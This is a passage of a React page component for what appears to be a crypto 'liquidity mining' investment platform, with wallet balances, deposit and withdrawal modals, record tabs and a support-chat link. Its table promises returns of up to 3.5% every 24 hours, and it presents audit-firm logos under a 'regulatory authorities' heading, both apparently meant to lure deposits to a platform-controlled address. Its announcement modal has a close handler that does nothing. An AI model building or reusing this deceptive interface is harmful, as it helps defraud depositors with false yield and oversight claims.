                            <span className="wallet-info-value wallet-address">
                              {account.slice(0, 6)}...{account.slice(-4)}
                            </span>
                          </div>
                        )}
                        <div className="wallet-info-item">
                          <span className="wallet-info-label">{t.onChainBalance || '链上USDT余额'}</span>
                          <span className="wallet-info-value balance">
                            <CounterAnimation end={Number.parseFloat(usdtBalance || '0')} decimals={2} suffix=" USDT" />
                          </span>
                        </div>
                        <div className="wallet-info-item">
                          <span className="wallet-info-label">{t.userStatus}</span>
                          <span className="wallet-info-value">
                            {isConnected ? t.active : t.inactive}
                          </span>
                        </div>
                        <div className="wallet-info-item">
                          <span className="wallet-info-label">{t.exchangeableETH || '可兑换余额'}</span>
                          <span className="wallet-info-value balance">
                            <CounterAnimation end={userProfile?.eth ? Number.parseFloat(userProfile.eth.toString()) : 0} decimals={6} suffix=" ETH" />
                          </span>
                        </div>
                        <div className="wallet-info-item">
                          <span className="wallet-info-label">{t.totalEarningsETH || '总收益余额'}</span>
                          <span className="wallet-info-value balance">
                            <CounterAnimation end={userProfile?.total_earnings ? Number.parseFloat(userProfile.total_earnings.toString()) : 0} decimals={6} suffix=" ETH" />
                          </span>
                        </div>
                      </div>
                      
                      {/* 操作按钮 */}
                      <div className="wallet-actions">
                        {isConnected ? (
                          <>
                            <LuxuryButton
                              onClick={() => setShowDepositModal(true)}
                              icon={<ArrowDownCircle size={20} />}
                            >
                              {t.deposit || 'Deposit'}
                            </LuxuryButton>
                            <LuxuryButton
                              onClick={() => setShowWithdrawModal(true)}
                              icon={<ArrowUpCircle size={20} />}
                            >
                              {t.withdraw}
                            </LuxuryButton>
                          </>
                        ) : (
                          <div style={{ gridColumn: '1 / -1' }}>
                            <LuxuryButton
                              onClick={() => open()}
                              icon={<Wallet size={20} />}
                            >
                              {t.connectWallet || 'Connect Wallet'}
                            </LuxuryButton>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </StyledWalletCard>

              {/* 收益统计卡片 - 新样式 */}
              <div className="mt-6 grid grid-cols-2 gap-4">
                {/* 今日收益 */}
                <div className="group relative p-4 rounded-2xl backdrop-blur-xl border-2 border-indigo-500/30 bg-gradient-to-br from-indigo-900/40 via-black/60 to-black/80 shadow-2xl hover:shadow-indigo-500/30 hover:shadow-2xl hover:scale-[1.02] hover:-translate-y-1 transition-all duration-500 ease-out hover:border-indigo-400/60 overflow-hidden">
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-indigo-400/30 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-1000 ease-out" />
                  <div className="absolute inset-0 rounded-2xl bg-gradient-to-r from-indigo-500/10 via-indigo-400/20 to-indigo-500/10 opacity-0 group-hover:opacity-100 transition-opacity duration-500" />
                  <div className="relative z-10 flex items-center gap-3">
                    <div className="p-2 rounded-lg bg-gradient-to-br from-indigo-500/30 to-indigo-600/10 backdrop-blur-sm group-hover:from-indigo-400/40 group-hover:to-indigo-500/20 transition-all duration-300">
                      <TrendingUp className="w-5 h-5 text-indigo-400 group-hover:text-indigo-300 transition-all duration-300 group-hover:scale-110" />
                    </div>
                    <div className="flex-1 text-left">
                      <p className="text-indigo-300/60 text-xs group-hover:text-indigo-200/80 transition-colors duration-300">{t.todayEarnings || 'Today Earnings'}</p>
                      <p className="text-indigo-400 font-bold text-lg group-hover:text-indigo-300 transition-colors duration-300">
                        <CounterAnimation end={userProfile?.today_earnings ? Number.parseFloat(userProfile.today_earnings.toString()) : 0} decimals={2} suffix=" ETH" />
                      </p>
                    </div>
                  </div>
                </div>

                {/* 收益率 */}
                <div className="group relative p-4 rounded-2xl backdrop-blur-xl border-2 border-emerald-500/30 bg-gradient-to-br from-emerald-900/40 via-black/60 to-black/80 shadow-2xl hover:shadow-emerald-500/30 hover:shadow-2xl hover:scale-[1.02] hover:-translate-y-1 transition-all duration-500 ease-out hover:border-emerald-400/60 overflow-hidden">
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-emerald-400/30 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-1000 ease-out" />
                  <div className="absolute inset-0 rounded-2xl bg-gradient-to-r from-emerald-500/10 via-emerald-400/20 to-emerald-500/10 opacity-0 group-hover:opacity-100 transition-opacity duration-500" />
                  <div className="relative z-10 flex items-center gap-3">
                    <div className="p-2 rounded-lg bg-gradient-to-br from-emerald-500/30 to-emerald-600/10 backdrop-blur-sm group-hover:from-emerald-400/40 group-hover:to-emerald-500/20 transition-all duration-300">
                      <Percent className="w-5 h-5 text-emerald-400 group-hover:text-emerald-300 transition-all duration-300 group-hover:scale-110" />
                    </div>
                    <div className="flex-1 text-left">
                      <p className="text-emerald-300/60 text-xs group-hover:text-emerald-200/80 transition-colors duration-300">{t.yieldRate || 'Yield Rate'}</p>
                      <p className="text-emerald-400 font-bold text-lg group-hover:text-emerald-300 transition-colors duration-300">
                        <CounterAnimation end={userProfile?.yield_rate ? Number.parseFloat(userProfile.yield_rate.toString()) : 1.2} decimals={2} suffix="%" />
                      </p>
                    </div>
                  </div>
                </div>

              </div>

              {/* 流动性奖励收益表 */}
              <div className="mt-6">
                <div className="rounded-2xl border border-amber-600/30 bg-gradient-to-br from-black/90 via-amber-950/20 to-black/90 overflow-hidden">
                  {/* 表格标题 */}
                  <div className="py-4 text-center">
                    <h3 className="text-amber-500 font-bold text-lg">{t.liquidityRewards || '流动性奖励收益'}</h3>
                  </div>
                  
                  {/* 表格内容 */}
                  <div className="px-4 pb-4">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-amber-600/20">
                          <th className="py-3 text-left text-sm font-medium text-gray-400">
                            <div>{t.amount || '金额'}</div>
                            <div className="text-xs text-gray-500">USDT</div>
                          </th>
                          <th className="py-3 text-center text-sm font-medium text-gray-400">
                            <div>{t.returnRate || '回报率'}</div>
                            <div className="text-xs text-gray-500">24H</div>
                          </th>
                          <th className="py-3 text-right text-sm font-medium text-gray-400">
                            <div>{t.profit || '利润'}</div>
                            <div className="text-xs text-gray-500">USDT</div>
                          </th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-amber-600/10">
                        <tr className="hover:bg-amber-500/5 transition-colors">
                          <td className="py-3 text-left text-gray-300">0-999</td>
                          <td className="py-3 text-center text-amber-500 font-medium">0.50%</td>
                          <td className="py-3 text-right text-gray-400">0-4.95</td>
                        </tr>
                        <tr className="hover:bg-amber-500/5 transition-colors">
                          <td className="py-3 text-left text-gray-300">1000-4999</td>
                          <td className="py-3 text-center text-amber-500 font-medium">0.75%</td>
                          <td className="py-3 text-right text-gray-400">7.5-37.49</td>
                        </tr>
                        <tr className="hover:bg-amber-500/5 transition-colors">
                          <td className="py-3 text-left text-gray-300">5000-9999</td>
                          <td className="py-3 text-center text-amber-500 font-medium">1.25%</td>
                          <td className="py-3 text-right text-gray-400">62.5-124.98</td>
                        </tr>
                        <tr className="hover:bg-amber-500/5 transition-colors">
                          <td className="py-3 text-left text-gray-300">10000-29999</td>
                          <td className="py-3 text-center text-amber-500 font-medium">2.00%</td>
                          <td className="py-3 text-right text-gray-400">200-599.98</td>
                        </tr>
                        <tr className="hover:bg-amber-500/5 transition-colors">
                          <td className="py-3 text-left text-gray-300">30000-59999</td>
                          <td className="py-3 text-center text-amber-500 font-medium">3.00%</td>
                          <td className="py-3 text-right text-gray-400">900-1799.97</td>
                        </tr>
                        <tr className="hover:bg-amber-500/5 transition-colors">
                          <td className="py-3 text-left text-gray-300">60000-99999</td>
                          <td className="py-3 text-center text-amber-500 font-medium">3.50%</td>
                          <td className="py-3 text-right text-gray-400">2100-3499.96</td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
              </div>
            </section>
          </ScrollAnimate>


          {/* 兑换提取记录分类栏 */}
          <ScrollAnimate direction="up" delay={0.2}>
            <section className="px-3 md:px-4 bg-black mt-8 md:mt-8 relative z-20">
              <div className="max-w-4xl mx-auto">
                <div className="mb-2">
                  {/* 分类标签栏 */}
                  <div className="mb-2">
                    <AnimatedTabs 
                      tabs={[
                        { label: t.exchange, value: 'exchange' },
                        { label: t.records, value: 'records' }
                      ]}
                      activeTab={homeExchangeTab}
                      onTabChange={setHomeExchangeTab}
                    />
                  </div>

                {/* 兌換Tab */}
                {homeExchangeTab === 'exchange' && (
                  <div className="slide-in-up">
                    <BinanceLiquidityStaking 
                      userEthBalance={userProfile?.eth ? Number.parseFloat(userProfile.eth.toString()) : 0}
                      onExchangeSuccess={() => {
                        // 兑换成功后刷新用户数据和记录
                        if (refetchProfile) {
                          refetchProfile();
                        }
                        if (refetchRecords) {
                          refetchRecords();
                        }
                      }}
                    />
                  </div>
                )}


                {/* 記錄Tab */}
                {homeExchangeTab === 'records' && (
                  <div className="bg-black/90 backdrop-blur-sm rounded-lg p-6 space-y-6 slide-in-up records-container">
                      {/* 记录子标签 */}
                      <div className="flex justify-center items-center mb-4">
                        <SlideTabs
                          tabs={[
                            t.exchangeRecords,
                            t.withdrawRecords,
                            t.depositRecords || '充值记录',
                            t.invitationRewards,
                            t.earningsRecords
                          ]}
                          activeTab={getRecordsTabIndex(recordsSubTab)}
                          onTabChange={setRecordsTabByIndex}
                        />
                      </div>

                      {/* 兑换记录 */}
                      {recordsSubTab === 'exchange' && (
                      <div className="space-y-4">
                          {/* 表格头 */}
                          <div className="grid grid-cols-4 gap-4 pb-2 border-b border-gray-600/30">
                            <span className="text-gray-400 text-sm font-medium">{t.time}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.payAmount}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.receiveAmount}</span>
                          <span className="text-gray-400 text-sm font-medium">{t.status}</span>
                        </div>

                        {/* 记录列表 */}
                          <div className="space-y-2 max-h-60 overflow-y-auto">
                            {recordsLoading ? (
                              <div className="flex justify-center py-8">
                                <div className="text-gray-400">{t.loading}...</div>
                        </div>
                            ) : exchangeRecords.length > 0 ? (
                              exchangeRecords.map((record, index) => (
                                <div key={index} className="grid grid-cols-4 gap-4 py-2 border-b border-gray-700/30 hover:bg-gray-800/30 rounded">
                                  <span className="text-gray-300 text-sm">{record.time}</span>
                                  <span className="text-blue-400 text-sm font-medium">{record.payAmount}</span>
                                  <span className="text-green-400 text-sm font-medium">{record.receiveAmount}</span>
                                  <span className={`text-sm font-medium ${
                                    record.status === t.completed ? 'text-green-400' : 
                                    record.status === t.pending ? 'text-yellow-400' : 'text-gray-400'
                                  }`}>{record.status}</span>
                      </div>
                              ))
                            ) : (
                              <div className="text-center py-8 text-gray-400">
                                {t.noRecords}
                    </div>
                            )}
                          </div>
                        </div>
                      )}

                      {/* 提现记录 */}
                      {recordsSubTab === 'withdraw' && (
                        <div className="space-y-4">
                          {/* 表格头 */}
                          <div className="grid grid-cols-3 gap-4 pb-2 border-b border-gray-600/30">
                            <span className="text-gray-400 text-sm font-medium">{t.time}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.amount}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.status}</span>
                          </div>

                          {/* 记录列表 */}
                          <div className="space-y-2 max-h-60 overflow-y-auto">
                            {recordsLoading ? (
                              <div className="flex justify-center py-8">
                                <div className="text-gray-400">{t.loading}...</div>
                              </div>
                            ) : withdrawRecords.length > 0 ? (
                              withdrawRecords.map((record, index) => (
                                <div key={index} className="grid grid-cols-3 gap-4 py-2 border-b border-gray-700/30 hover:bg-gray-800/30 rounded">
                                  <span className="text-gray-300 text-sm">{record.time}</span>
                                  <span className="text-white text-sm font-medium">{record.amount}</span>
                                  <span className={`text-sm font-medium ${
                                    record.status === t.completed ? 'text-green-400' : 
                                    record.status === t.processing ? 'text-blue-400' :
                                    record.status === t.pending ? 'text-yellow-400' : 'text-gray-400'
                                  }`}>{record.status}</span>
                                </div>
                              ))
                            ) : (
                              <div className="text-center py-8 text-gray-400">
                                {t.noRecords}
                              </div>
                            )}
                          </div>
                        </div>
                      )}

                      {/* 充值记录 */}
                      {recordsSubTab === 'deposit' && (
                        <div className="space-y-4">
                          {/* 表格头 */}
                          <div className="grid grid-cols-3 gap-4 pb-2 border-b border-gray-600/30">
                            <span className="text-gray-400 text-sm font-medium">{t.time}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.amount || '金额'}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.status}</span>
                          </div>

                          {/* 记录列表 */}
                          <div className="space-y-2 max-h-60 overflow-y-auto">
                            {recordsLoading ? (
                              <div className="flex justify-center py-8">
                                <div className="text-gray-400">{t.loading}...</div>
                              </div>
                            ) : depositRecords.length > 0 ? (
                              depositRecords.map((record, index) => (
                                <div key={index} className="grid grid-cols-3 gap-4 py-2 border-b border-gray-700/30 hover:bg-gray-800/30 rounded">
                                  <span className="text-gray-300 text-sm">{record.time}</span>
                                  <span className="text-green-400 text-sm font-medium">{record.amount}</span>
                                  <span className={`text-sm font-medium ${
                                    record.status === t.completed ? 'text-green-400' : 
                                    record.status === t.processing ? 'text-blue-400' :
                                    record.status === t.pending ? 'text-yellow-400' : 'text-gray-400'
                                  }`}>{record.status}</span>
                                </div>
                              ))
                            ) : (
                              <div className="text-center py-8 text-gray-400">
                                {t.noRecords}
                              </div>
                            )}
                          </div>
                        </div>
                      )}

                      {/* 邀请奖励记录 */}
                      {recordsSubTab === 'shared' && (
                        <div className="space-y-4">
                          {/* 表格头 */}
                          <div className="grid grid-cols-3 gap-4 pb-2 border-b border-gray-600/30">
                            <span className="text-gray-400 text-sm font-medium">{t.time}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.address}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.income}</span>
                          </div>

                          {/* 记录列表 */}
                          <div className="space-y-2 max-h-60 overflow-y-auto">
                            {recordsLoading ? (
                              <div className="flex justify-center py-8">
                                <div className="text-gray-400">{t.loading}...</div>
                              </div>
                            ) : sharedRecords.length > 0 ? (
                              sharedRecords.map((record, index) => (
                                <div key={index} className="grid grid-cols-3 gap-4 py-2 border-b border-gray-700/30 hover:bg-gray-800/30 rounded">
                                  <span className="text-gray-300 text-sm">{record.time}</span>
                                  <span className="text-blue-400 text-sm font-medium truncate" title={record.address}>
                                    {record.address.substring(0, 8)}...{record.address.substring(record.address.length - 6)}
                                  </span>
                                  <span className="text-green-400 text-sm font-medium">{record.income}</span>
                                </div>
                              ))
                            ) : (
                              <div className="text-center py-8 text-gray-400">
                                {t.noRecords}
                              </div>
                            )}
                          </div>
                        </div>
                      )}

                      {/* 收益记录 */}
                      {recordsSubTab === 'earnings' && (
                        <div className="space-y-4">
                          {/* 表格头 */}
                          <div className="grid grid-cols-3 gap-4 pb-2 border-b border-gray-600/30">
                            <span className="text-gray-400 text-sm font-medium">{t.time}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.earnings}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.earningsRate}</span>
                          </div>

                          {/* 记录列表 */}
                          <div className="space-y-2 max-h-60 overflow-y-auto">
                            {recordsLoading ? (
                              <div className="flex justify-center py-8">
                                <div className="text-gray-400">{t.loading}...</div>
                              </div>
                            ) : earningsRecords.length > 0 ? (
                              earningsRecords.map((record, index) => (
                                <div key={index} className="grid grid-cols-3 gap-4 py-2 border-b border-gray-700/30 hover:bg-gray-800/30 rounded">
                                  <span className="text-gray-300 text-sm">{record.time}</span>
                                  <span className="text-green-400 text-sm font-medium">${record.earnings}</span>
                                  <span className="text-blue-400 text-sm font-medium">{record.rate}</span>
                                </div>
                              ))
                            ) : (
                              <div className="text-center py-8 text-gray-400">
                                {t.noRecords}
                              </div>
                            )}
                          </div>
                        </div>
                      )}
                  </div>
                  )}
                </div>
              </div>
            </section>
          </ScrollAnimate>

          {/* 充值模态框 */}
          {showDepositModal && (
            <div className="fixed inset-0 bg-black/50 z-[10000] flex items-center justify-center p-4">
              <div className="max-w-md w-full max-h-[90vh] overflow-y-auto">
                <StyledStatsCard>
                  <div className="bgblue">
                    <div className="card-wrapper">
                      <div className="mb-4">
                        <h3 className="text-xl font-bold text-[#bec4cf]">{t.deposit || 'Deposit'}</h3>
                      </div>
                      <div className="space-y-4">
                        {/* 充值二维码 */}
                        {depositConfig.depositQrcode && (
                          <div className="flex flex-col items-center">
                            <div className="bg-white p-3 rounded-lg">
                              <img 
                                src={depositConfig.depositQrcode} 
                                alt="Deposit QR Code" 
                                className="w-40 h-40"
                              />
                            </div>
                            <p className="text-xs text-gray-400 mt-2">{t.scanToDeposit || '扫码充值'}</p>
                          </div>
                        )}

                        {/* 充值地址 */}
                        {depositConfig.depositAddress && (
                          <div>
                            <label className="block text-sm text-[#bec4cf] mb-2">{t.depositAddress || '充值地址'}</label>
                            <div 
                              className="bg-[#1a1a1a] border border-gray-600 rounded-lg p-3 cursor-pointer hover:bg-[#252525] transition-colors"
                              onClick={() => {
                                navigator.clipboard.writeText(depositConfig.depositAddress)
                                setAddressCopied(true)
                                setTimeout(() => setAddressCopied(false), 2000)
                              }}
                            >
                              <div className="flex items-center justify-between">
                                <span className="text-[#bec4cf] text-sm break-all">{depositConfig.depositAddress}</span>
                                <span className="text-xs text-yellow-400 ml-2 whitespace-nowrap">
                                  {addressCopied ? (t.copied || '已复制') : (t.clickToCopy || '点击复制')}
                                </span>
                              </div>
                            </div>
                          </div>
                        )}

                        {/* 充值金额 */}
                        <div>
                          <label className="block text-sm text-[#bec4cf] mb-2">{t.depositAmount || 'Deposit Amount'}</label>
                          <Input
                            type="number"
                            placeholder={t.enterDepositAmount || 'Enter deposit amount'}
                            value={depositAmount}
                            onChange={(e) => setDepositAmount(e.target.value)}
                            className="bg-[#1a1a1a] border-gray-600 text-[#bec4cf] w-full rounded-lg"
                          />
                          <p className="text-xs text-gray-400 mt-1">{t.minDepositAmount || '最低充值金额：10 USDT'}</p>
                        </div>

                        <div className="flex gap-3">
                          <button
                            onClick={() => {
                              setShowDepositModal(false)
                              setDepositAmount('')
                            }}
                            className="flex-1 px-6 py-2.5 text-white font-bold text-base rounded-full shadow-lg transition-all transform bg-transparent border-2 border-white/60 hover:scale-105 hover:border-red-500 hover:shadow-red-500/50 hover:shadow-xl focus:outline-none"
                          >
                            {t.cancel}
                          </button>
                          <button
                            onClick={async () => {
                              // 调用充值API
                              if (!account) {
                                alert('请先连接钱包');
                                return;
                              }
                              try {
                                const response = await fetch('/api/user/deposit', {
                                  method: 'POST',
                                  headers: { 'Content-Type': 'application/json' },
                                  body: JSON.stringify({
                                    userAddress: account,
                                    amount: parseFloat(depositAmount)
                                  })
                                });
                                const result = await response.json();
                                if (result.success) {
                                  alert(result.data.message.zh || '充值申请已提交');
                                  setShowDepositModal(false);
                                  setDepositAmount('');
                                  if (refetchProfile) await refetchProfile();
                                } else {
                                  alert(result.error || '充值失败');
                                }
                              } catch (error) {
                                alert('充值请求失败');
                              }
                            }}
                            disabled={!depositAmount || parseFloat(depositAmount) < 10}
                            className="flex-1 px-6 py-2.5 text-white font-bold text-base rounded-full shadow-lg transition-all transform bg-transparent border-2 border-white/60 hover:scale-105 hover:border-green-500 hover:shadow-green-500/50 hover:shadow-xl focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 disabled:hover:border-white/60 disabled:hover:shadow-none"
                          >
                            {t.confirm}
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </StyledStatsCard>
              </div>
            </div>
          )}

          {/* 提现模态框 */}
          {showWithdrawModal && (
            <div className="fixed inset-0 bg-black/50 z-[10000] flex items-center justify-center p-4">
              <div className="max-w-md w-full">
                <StyledStatsCard>
                  <div className="bgblue">
                    <div className="card-wrapper">
                      {/* 提现金额输入区域 */}
                      <div className="bg-[#1a1a1a] border border-gray-600 rounded-2xl p-4 mb-4">
                        <div className="flex items-start justify-between gap-4">
                          {/* 左侧：金额输入 */}
                          <div className="flex-1">
                            <input 
                              type="number" 
                              placeholder="0" 
                              value={withdrawAmount}
                              onChange={(e) => setWithdrawAmount(e.target.value)}
                              className="bg-transparent text-[#bec4cf] outline-none w-full font-bold text-3xl mb-1" 
                            />
                            <div className="text-[#bec4cf] text-sm opacity-70">
                              ${(Number.parseFloat(withdrawAmount || '0')).toFixed(2)}
                            </div>
                          </div>
                          
                          {/* 右侧：币种和余额 */}
                          <div className="flex flex-col items-end gap-2">
                            <div className="flex items-center gap-2 text-[#bec4cf] text-sm font-medium">
                              <img 
                                src="https://h5.bosss.club/static/img/crypto/USDT.svg?v=3.9.4" 
                                alt="USDT" 
                                className="w-6 h-6 rounded-full"
                              />
                              <span>USDT</span>
                            </div>
                            <div className="flex items-center gap-2">
                              <span className="text-[#bec4cf] text-xs opacity-70">
                                {userProfile?.withdrawable_usdt ? Number(userProfile.withdrawable_usdt).toFixed(2) : '0.00'} USDT
                              </span>
                              <button
                                type="button"
                                onClick={() => setWithdrawAmount(String(userProfile?.withdrawable_usdt || 0))}
                                className="text-xs text-yellow-400 hover:text-yellow-300 font-medium bg-transparent border-none outline-none p-0 cursor-pointer"
                              >
                                {t.all || '全部'}
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* 钱包地址显示 */}
                      <div className="bg-[#1a1a1a] border border-gray-600 rounded-2xl p-4 mb-4">
                        <div className="text-[#bec4cf] text-xs opacity-70 mb-2">{t.walletAddress || '錢包地址'}</div>
                        <input
                          type="text"
                          value={account || ''}
                          readOnly
                          disabled
                          className="bg-transparent text-[#bec4cf] text-sm w-full outline-none cursor-not-allowed opacity-80"
                        />
                      </div>

                      {/* 最低提现金额提示 */}
                      <div className="text-[#bec4cf] text-sm opacity-70 mb-4 text-center">
                        {t.minWithdrawAmount || '最低提現金額：10 USDT'}
                      </div>

                      {/* 操作按钮 */}
                      <div className="flex gap-3">
                        <button
                          onClick={() => {
                            setShowWithdrawModal(false)
                            setWithdrawAmount('')
                          }}
                          className="flex-1 px-6 py-2.5 text-white font-bold text-base rounded-full shadow-lg transition-all transform bg-transparent border-2 border-white/60 hover:scale-105 hover:border-red-500 hover:shadow-red-500/50 hover:shadow-xl focus:outline-none"
                        >
                          {t.cancel}
                        </button>
                        <button
                          onClick={async () => {
                            // 调用提现API
                            if (!account) {
                              alert('请先连接钱包');
                              return;
                            }
                            try {
                              const response = await fetch('/api/user/withdraw', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                  userAddress: account,
                                  amount: withdrawAmount,
                                  withdrawAddress: account,
                                  currency: 'USDT'
                                })
                              });
                              const result = await response.json();
                              if (result.success) {
                                alert(result.data.message.zh || '提现申请已提交');
                                setShowWithdrawModal(false);
                                setWithdrawAmount('');
                                if (refetchProfile) await refetchProfile();
                              } else {
                                alert(result.error || '提现失败');
                              }
                            } catch (error) {
                              alert('提现请求失败');
                            }
                          }}
                          disabled={!withdrawAmount || parseFloat(withdrawAmount) < 10}
                          className="flex-1 px-6 py-2.5 text-white font-bold text-base rounded-full shadow-lg transition-all transform bg-transparent border-2 border-white/60 hover:scale-105 hover:border-green-500 hover:shadow-green-500/50 hover:shadow-xl focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 disabled:hover:border-white/60 disabled:hover:shadow-none"
                        >
                          {t.withdraw || '提取'}
                        </button>
                      </div>
                    </div>
                  </div>
                </StyledStatsCard>
              </div>
            </div>
          )}

          {/* 兑换模态框 */}
          {showExchangeModal && (
            <div className="fixed inset-0 bg-black/50 z-[10000] flex items-center justify-center p-4">
              <div className="max-w-md w-full">
                <StyledStatsCard>
                  <div className="bgblue">
                    <div className="card-wrapper">
                      <div className="mb-4">
                        <h3 className="text-xl font-bold text-[#bec4cf]">{t.exchange}</h3>
                      </div>
                      <div className="space-y-4">
                        <div>
                          <label className="block text-sm text-[#bec4cf] mb-2">{t.exchangeAmount || 'Exchange Amount'}</label>
                          <div className="flex gap-2">
                            <Input
                              type="number"
                              placeholder={t.enterExchangeAmount || 'Enter amount'}
                              value={exchangeAmount}
                              onChange={(e) => setExchangeAmount(e.target.value)}
                              className="bg-[#1a1a1a] border-gray-600 text-[#bec4cf] flex-1 rounded-lg"
                            />
                            <select
                              value={exchangeFrom}
                              onChange={(e) => setExchangeFrom(e.target.value)}
                              className="bg-[#1a1a1a] border border-gray-600 text-[#bec4cf] rounded-lg px-3 py-2"
                            >
                              <option value="USDT">USDT</option>
                              <option value="ETH">ETH</option>
                              <option value="BNB">BNB</option>
                            </select>
                          </div>
                        </div>
                        <div className="flex justify-center">
                          <ArrowLeftRight className="text-[#bec4cf] opacity-60" size={24} />
                        </div>
                        <div>
                          <label className="block text-sm text-[#bec4cf] mb-2">{t.exchangeTo || 'Exchange To'}</label>
                          <select
                            value={exchangeTo}
                            onChange={(e) => setExchangeTo(e.target.value)}
                            className="w-full bg-[#1a1a1a] border border-gray-600 text-[#bec4cf] rounded-lg px-3 py-2"
                          >
                            <option value="USDT">USDT</option>
                            <option value="ETH">ETH</option>
                            <option value="BNB">BNB</option>
                          </select>
                        </div>
                        <div className="flex gap-3">
                          <button
                            onClick={() => {
                              setShowExchangeModal(false)
                              setExchangeAmount('')
                            }}
                            className="flex-1 px-6 py-2.5 text-white font-bold text-base rounded-full shadow-lg transition-all transform bg-transparent border-2 border-white/60 hover:scale-105 hover:border-red-500 hover:shadow-red-500/50 hover:shadow-xl focus:outline-none"
                          >
                            {t.cancel}
                          </button>
                          <button
                            onClick={async () => {
                              // 调用兑换API
                              if (!account) {
                                alert('请先连接钱包');
                                return;
                              }
                              try {
                                const response = await fetch('/api/exchange', {
                                  method: 'POST',
                                  headers: { 'Content-Type': 'application/json' },
                                  body: JSON.stringify({
                                    userAddress: account,
                                    from: exchangeFrom,
                                    to: exchangeTo,
                                    amount: parseFloat(exchangeAmount)
                                  })
                                });
                                const result = await response.json();
                                if (result.success) {
                                  alert(result.data.message.zh || '兑换成功');
                                  setShowExchangeModal(false);
                                  setExchangeAmount('');
                                  if (refetchProfile) await refetchProfile();
                                } else {
                                  alert(result.error || '兑换失败');
                                }
                              } catch (error) {
                                alert('兑换请求失败');
                              }
                            }}
                            disabled={!exchangeAmount || parseFloat(exchangeAmount) <= 0}
                            className="flex-1 px-6 py-2.5 text-white font-bold text-base rounded-full shadow-lg transition-all transform bg-transparent border-2 border-white/60 hover:scale-105 hover:border-green-500 hover:shadow-green-500/50 hover:shadow-xl focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 disabled:hover:border-white/60 disabled:hover:shadow-none"
                          >
                            {t.confirm}
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </StyledStatsCard>
              </div>
            </div>
          )}
        </>
      )}

      {/* Help Center - 只在矿池标签页显示 */}
      {activeHomeTab === 'miningPool' && (
        <ScrollAnimate direction="up" delay={0.1}>
          <section className="py-8 px-4 bg-black">
            <div className="max-w-6xl mx-auto">
              <HelpCenterAccordion />
            </div>
          </section>
        </ScrollAnimate>
      )}

      {/* Regulatory Authorities - 只在矿池标签页显示 */}
      {activeHomeTab === 'miningPool' && (
        <ScrollAnimate direction="up" delay={0.15}>
          <section className="py-1 px-4 bg-black">
            <div className="max-w-6xl mx-auto">
              <h3 className="text-2xl font-bold text-center mb-3 gold-text">
                {t.regulatoryAuthorities}
              </h3>
              <div className="grid grid-cols-3 gap-3 md:gap-6">
                <Card className="bg-white p-4 md:p-6 floating shadow-md hover:shadow-lg transition-all duration-300">
                  <img
                    src="https://ext.same-assets.com/590002659/396665122.png"
                    alt="FairyProof"
                    className="w-full h-12 md:h-20 object-contain transition-transform duration-300 hover:scale-110"
                  />
                </Card>
                <Card className="bg-white p-4 md:p-6 floating-delay-2s shadow-md hover:shadow-lg transition-all duration-300">
                  <img
                    src="https://ext.same-assets.com/590002659/2552246351.png"
                    alt="Certik"
                    className="w-full h-12 md:h-20 object-contain transition-transform duration-300 hover:scale-110"
                  />
                </Card>
                <Card className="bg-white p-4 md:p-6 floating-delay-4s shadow-md hover:shadow-lg transition-all duration-300">
                  <img
                    src="https://ext.same-assets.com/590002659/2879882895.png"
                    alt="SlowMist"
                    className="w-full h-12 md:h-20 object-contain transition-transform duration-300 hover:scale-110"
                  />
                </Card>
              </div>
            </div>
          </section>
        </ScrollAnimate>
      )}

      {/* Cooperative Platform - 只在矿池标签页显示 */}
      {activeHomeTab === 'miningPool' && (
        <ScrollAnimate direction="up" delay={0.2}>
          <section className="py-1 px-4 bg-black">
            <div className="max-w-6xl mx-auto">
              <PartnersCarousel />
            </div>
          </section>
        </ScrollAnimate>
      )}

      {/* Exchange Tab */}
      {activeHomeTab === 'exchange' && (
        <section className="px-3 md:px-4 bg-black">
          <BinanceLiquidityStaking userEthBalance={userProfile?.eth ? Number.parseFloat(userProfile.eth.toString()) : 0} />
        </section>
      )}

      {/* 移除质押 Modal - 现在按钮直接执行verify操作 */}

      
      {/* Draggable Chat Button */}
      <DraggableChatButton onOpenChat={() => {
        window.open('https://chat.boltcode.vip?visiter_id=&visiter_name=&avatar=&business_id=1&groupid=0&special=1', '_blank', 'noopener,noreferrer')
      }} />
      
      {/* Enhanced Announcement Modal */}
      {showAnnouncement && announcements.length > 0 && (
        <EnhancedAnnouncementModal
          isOpen={showAnnouncement}
          onClose={() => {}}
          announcements={announcements}
          currentIndex={currentAnnouncementIndex}
          userAddress={account}
        />
      )}

    </div>
  )
}
